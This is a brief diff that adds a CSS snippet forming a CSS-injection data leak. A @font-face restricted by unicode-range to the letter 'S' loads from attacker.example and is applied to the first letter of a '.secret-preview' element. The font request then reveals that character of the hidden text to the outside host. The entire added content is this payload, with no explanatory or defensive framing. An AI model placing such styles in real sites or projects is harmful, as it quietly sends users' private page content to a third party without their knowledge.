@@ -1,0 +1,11 @@
+@font-face {
+  font-family: "RenderedLetterLeak";
+  src: url("https://attacker.example/rendered-letter.woff2");
+  unicode-range: U+0053;
+}
+
+.secret-preview::first-letter {
+  font-family: "RenderedLetterLeak";
+  font-size: 120px;
+  text-transform: uppercase;
+}
